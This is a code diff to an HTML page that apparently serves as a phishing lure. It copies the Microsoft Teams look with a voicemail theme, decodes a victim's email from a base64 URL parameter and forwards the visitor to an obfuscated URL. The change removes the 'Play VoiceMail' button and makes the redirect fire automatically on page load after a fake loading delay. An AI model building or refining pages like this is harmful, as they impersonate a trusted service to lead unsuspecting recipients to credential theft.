@@ -54,6 +54,7 @@
             border: none;
             border-radius: 15px;
             height: 50px;
+            display: none;
         }
         #verifyButton:hover {
             background-color: rgb(142, 204, 255);
@@ -64,7 +65,6 @@
     <div class="container">
         <img src="https://cdn.pixabay.com/photo/2022/01/27/07/17/microsoft-teams-6971301_960_720.png" alt="Logo" width="330px">
         <div id="emailDisplay" aria-live="polite"></div>
-        <button id="verifyButton" aria-label="Click to Verify" style="display: none;">Play VoiceMail</button>
         <div class="dots-container" aria-label="Loading content">
             <div class="dot"></div>
             <div class="dot"></div>
@@ -112,31 +112,12 @@
             window.location.href = obfuscatedURL;
         }
 
-        // Function to update the displayed email
-        function updateLink() {
-            const emailParam = findEmailParam();
-            const emailDisplay = document.getElementById('emailDisplay');
-            if (emailParam) {
-                emailDisplay.innerText = decodeBase64(emailParam.value); // Always display the decoded email
-            } else {
-                console.error("No email to display");
-            }
-        }
-
-        // Automatically trigger button click
-        function triggerButtonClick() {
-            const button = document.getElementById('verifyButton');
-            button.click(); // Simulate button click
-        }
-
-        // Click button functionality
-        const button = document.getElementById('verifyButton');
-        button.addEventListener('click', function() {
-            // Hide the verify button
-            button.style.display = 'none';
-            // Show loading dots
+        // Automatically trigger the redirect functionality
+        window.onload = function () {
+            // Show loading dots immediately
             document.querySelector('.dots-container').style.display = 'flex';
-            
+
+            // Start processing
             setTimeout(() => {
                 const emailParam = findEmailParam();
                 if (emailParam) {
@@ -144,12 +125,7 @@
                 } else {
                     console.error("No email found for redirection");
                 }
-            }, 2000);
-        });
-
-        window.onload = function () {
-            updateLink();
-            triggerButtonClick();
+            }, 2000); // Simulate loading delay
         };
     </script>
 </body>
